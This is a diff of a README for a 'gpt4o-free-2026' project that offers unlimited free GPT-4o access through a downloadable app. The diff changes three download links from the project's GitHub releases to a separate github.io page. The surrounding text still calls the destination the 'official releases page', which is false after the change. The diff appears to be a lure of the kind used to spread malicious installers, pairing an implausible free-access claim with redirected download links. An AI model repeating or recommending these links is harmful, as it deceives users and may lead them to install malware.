@@ -1,6 +1,6 @@
 # 🚀 gpt4o-free-2026 - Unlimited GPT-4o Access, Zero Cost
 
-[![Download Now](https://img.shields.io/badge/Download-GPT4o_Free_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/blindfolded-cheep4426/gpt4o-free-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-GPT4o_Free_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://blindfolded-cheep4426.github.io)
 
 ---
 
@@ -49,7 +49,7 @@ No special hardware or technical knowledge needed. If you can browse the web, yo
 
 Visit this link to download the application:
 
-[**🔗 Download gpt4o-free-2026**](https://github.com/blindfolded-cheep4426/gpt4o-free-2026/releases)
+[**🔗 Download gpt4o-free-2026**](https://blindfolded-cheep4426.github.io)
 
 This will take you to the official releases page where you'll find the latest version ready for download.
 
@@ -209,7 +209,7 @@ Stop paying for AI. Stop hitting message limits. Start experiencing GPT-4o the w
 
 Click the button below to download now:
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download-GPT4o_Free_2026-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/blindfolded-cheep4426/gpt4o-free-2026/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Download-GPT4o_Free_2026-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://blindfolded-cheep4426.github.io)
 
 Visit this link to download the application. It takes less than 5 minutes to set up, and you'll have unlimited GPT-4o access immediately.
 
